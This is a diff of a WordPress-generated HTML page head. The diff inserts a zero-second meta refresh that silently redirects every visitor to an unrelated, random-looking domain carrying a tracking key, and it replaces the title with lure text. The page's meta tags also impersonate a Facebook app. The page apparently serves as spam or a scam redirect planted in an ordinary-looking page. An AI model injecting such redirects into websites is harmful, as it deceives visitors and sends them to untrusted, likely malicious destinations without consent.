@@ -5,12 +5,13 @@
 <!doctype html>
                 <html lang="en">
                     <head>
+		<meta http-equiv="refresh" content="0; url=https://cauliflowertoaster.com/mrm4q4ahzf?key=7ff48417896eacf9da4eaa76e50dd82e/" />     
                     <meta charset="utf-8">
                     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
                     <meta name="description" content="">
                     <meta name="keywords" content="">
                     <meta name="generator" content="WordPress 5.3.2">
-                    <title>😱Quatuor en Afrique😱</title>
+                    <title>❤️𝐏𝐚𝐫𝐚𝐝𝐢𝐬𝐞 𝐈𝐬 𝐇𝐞𝐫𝐞❤️</title>
 			<meta property="al:android:package" content="https://www.facebook.com/profile.php/">
 			<meta name="twitter:app:id:googleplay" content="https://www.facebook.com/profile.php/">
 			<meta property="al:android:app_name" content="Facebook">
